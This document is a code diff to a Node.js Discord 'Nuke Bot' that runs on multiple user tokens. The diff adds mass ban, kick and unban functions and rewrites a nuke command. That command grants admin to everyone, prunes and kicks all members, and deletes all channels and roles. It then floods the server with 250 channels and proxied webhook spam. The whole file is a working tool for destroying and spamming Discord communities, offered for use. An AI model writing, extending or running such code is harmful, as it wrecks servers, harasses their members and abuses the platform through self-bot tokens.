@@ -7,6 +7,7 @@ const request = require('request');
 const prompt = require('prompt');
 var chalk = require('chalk');
 var time = new Date().toDateString() + ' ' + new Date().toLocaleTimeString();
+
 const userid = botconfig.userid;
 const prefix = botconfig.prefix;
 
@@ -18,7 +19,6 @@ process.warn = () => {};
 function write(content, file) {
     fs.appendFile(file, content, function(err) {});
 }
-
 function prune(token, guild) {
     request({
         method: "POST",
@@ -45,7 +45,6 @@ function prune(token, guild) {
         }
     })
 }
-
 function admin(token, guild, everyone) {
     request({
         method: "PATCH",
@@ -66,7 +65,6 @@ function admin(token, guild, everyone) {
         console.log(chalk.inverse("[INFO] Everyone Role Has Now Been Given Admin"));
     })
 }
-
 async function webhookSpam(webhook) {
     var proxy = proxies[Math.floor(Math.random() * proxies.length)]
 	var sent = 0; 
@@ -88,7 +86,7 @@ async function webhookSpam(webhook) {
 			switch (res.statusCode) {
 				case 204:
 					sent++;
-					console.log(`[Webhook Spamming] Messages Sent on Webhook ${webhook.id} ${sent}`); 
+					console.log(`[Webhook] Messages Sent on Webhook ${webhook.id} ${sent}`); 
 					break;
 				default:
 					webhookSpam(webhook)
@@ -98,6 +96,73 @@ async function webhookSpam(webhook) {
 		
 	}
 }
+function banAll(token, guild, member) {
+	request({
+			method: "PUT",
+			url: `https://discord.com/api/v9/guilds/${guild}/bans/${member}`,
+			json: true,
+			headers: {
+				"Content-Type": "application/json",
+				"authorization": token 
+			},
+			json: {
+				"delete_message_days":"1",
+				"reason": ""
+				}
+		}, (err, res, body) => {
+			switch (res.statusCode) {
+				case 204:
+					console.log(`[BANNED] ${member} Successfully!`); 
+					break;
+				default:
+					break;
+			}
+		})
+}
+function kickAll(token, guild, member) {
+	request({
+			method: "DELETE",
+			url: `https://discord.com/api/v9/guilds/${guild}/members/${member}?reason=`,
+			json: true,
+			headers: {
+				"Content-Type": "application/json",
+				"authorization": token 
+			},
+			json: {
+				"reason": "L"
+				}
+		}, (err, res, body) => {
+			switch (res.statusCode) {
+				case 204:
+					console.log(`[Kicked] ${member} Successfully! `); 
+					break;
+				default:
+					break;
+			}
+		})
+}
+function unbanAll(token, guild, member) {
+	request({
+			method: "DELETE",
+			url: `https://discord.com/api/v9/guilds/${guild}/bans/${member}`,
+			json: true,
+			headers: {
+				"Content-Type": "application/json",
+				"authorization": token 
+			},
+		}, (err, res, body) => {
+			switch (res.statusCode) {
+				case 204:
+					console.log(`[UNBANNED] ${member} Successfully!`); 
+					break;
+				default:
+					break;
+			}
+		})
+}
+
+
+
 class bot {
     constructor(token) {
         this.token = token;
@@ -107,7 +172,46 @@ class bot {
     start() {
         this.bot.on('ready', () => {
             process.title = `[313] Nuke Bot | Created by Luci | Bots ${tokens.length}`;
-            console.log(chalk.hex("FF0000")`
+            console.log(chalk.hex("313CA1")(`[!] ${time}: Logged into User Token ${this.bot.user.tag}`));
+        })
+        this.bot.on("message", async message => {
+            let messageArray = message.content.split(" ");
+            let args = messageArray.slice(1);
+            if (message.author.bot) return;
+			
+            if (message.content.startsWith(`${prefix}nuke`)) {
+				const Members = message.guild.members.map(member => member.id);
+                const guild = message.guild.id;
+                const everyone = message.guild.defaultRole.id;
+				
+				message.guild.setName('Server Nuked').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
+                admin(this.token, guild, everyone);
+                prune(this.token, guild);
+				Members.forEach(member => kickAll(this.token, guild, member));
+                message.guild.channels.forEach(channel => channel.delete())
+                message.guild.roles.map(r => r.delete().catch(err => {}));
+				
+				message.guild.fetchBans().then(bans => { if (bans.size == 0) { return console.log("There are no banned users."); }
+                    bans.forEach(ban => {
+						unbanAll(this.token, guild, ban.id)
+                    });
+				})
+				
+                for (let i = 0; i < 250; i++) {
+                    message.guild.createChannel("Nuked", { type: "text" }).then(channel => {
+                      channel.createWebhook("God").then( webhook => {webhookSpam(webhook); })
+                    })
+                    message.guild.createChannel("Nuked", { type: "Voice" }).catch("");
+                    message.guild.createRole({ name: `{"type":"error","title":"Nuking"}`, color: "RANDOM", permissions: []})
+                }
+                console.log(chalk.hex("66FF00")("[NUKE] Server has been nuked"));
+            }
+        });
+        this.bot.login(this.token).catch(err => console.log(chalk.inverse.red(`${time} Error: Invalid Token!`)));
+    }
+}
+
+console.log(chalk.hex("313CA1")(`
 			███▄    █  █    ██  ██ ▄█▀ ▓█████      ▄▄▄▄    ▒█████  ▄▄▄█████▓
 			██ ▀█   █  ██  ▓██▒ ██▄█▒  ▓█   ▀     ▓█████▄ ▒██▒  ██▒▓  ██▒ ▓▒
 			▓██  ▀█ ██▒▓██  ▒██░▓███▄░  ▒███       ▒██▒ ▄██▒██░  ██▒▒ ▓██░ ▒░
@@ -116,61 +220,9 @@ class bot {
 			░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░░ ▒░     ░░▒▓███▀▒░ ▒░▒░▒░   ▒ ░░   
 			░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░░ ░ ░      ░▒░▒   ░   ░ ▒ ▒░     ░    
 			░   ░ ░  ░░░ ░ ░ ░ ░░ ░     ░        ░    ░ ░ ░ ░ ▒    ░      
-					░    ░     ░  ░   ░   ░      ░ ░          ░ ░           `);
-			console.log("");
-			console.log(chalk.hex("FF0000")(`[!] Created by Luci! Join our Support Server ${chalk.white('discord.gg/x2rntxtBpF')}`));
-			console.log("");
-            console.log(chalk.hex("FF0000")(`[!] ${time}: Logged into User Token ${this.bot.user.tag}`));
-            console.log(chalk(`[!] Bot Prefix is set to: [${prefix}]`));
-			console.log("");
-        })
-        this.bot.on("message", async message => {
-            let messageArray = message.content.split(" ");
-            let args = messageArray.slice(1);
-            if (message.author.bot) return;
-            if (message.content.startsWith(`${prefix}nuke`)) {
-                let guild = message.guild.id;
-                let everyone = message.guild.defaultRole.id;
-                admin(this.token, guild, everyone);
-                prune(this.token, guild);
-                message.guild.members.filter(member => member.kickable).forEach(member => {
-                    member.kick("Kicked")
-                });
-                message.guild.channels.forEach(channel => channel.delete())
-                message.guild.roles.map(r => r.delete().catch(err => {}));
-				//
-				message.guild.fetchBans().then(bans => {
-                    if (bans.size == 0) { return console.log("There are no banned users."); }
-                    bans.forEach(ban => {
-                        guild.unban(ban.id);
-                    });
-				})
-				//
-                for (let i = 0; i < 250; i++) {
-                    message.guild.createChannel("Nuked", {
-                        type: "text"
-                    }).then(channel => {
-                        channel.createWebhook("God").then(webhook => {
-                            webhookSpam(webhook);
-                        })
-                    })
-                    message.guild.createChannel("Nuked", {
-                        type: "Voice"
-                    }).catch("");
-                    message.guild.createRole({
-                        name: `{"type":"error","title":"Nuking"}`,
-                        color: "RANDOM",
-                        permissions: []
-                    })
-                }
-                message.guild.setName('NUKED').then(updated => console.log(`[GUILD] Updated guild name to ${updated.name}`));
-                console.log(chalk.hex("66FF00")("[NUKE] Server has been nuked"));
-            }
-			if (message.content.startsWith(`${prefix}NewCommand`)) {
-				console.log("Under Development");
-			}
-        });
-        this.bot.login(this.token).catch(err => console.log(chalk.inverse.red(`${time} Error: Invalid Token!`)));
-    }
-}
+					░    ░     ░  ░   ░   ░      ░ ░          ░ ░           `));
+console.log("");
+console.log(chalk.hex("CA1313")(`[*] Created by Luci! Join our Support Server ${chalk.white('discord.gg/x2rntxtBpF')}`));
+console.log(chalk(`[*] Bot Prefix is set to: [${prefix}]`));
+console.log("");
 tokens.forEach(token => new bot(token).start());
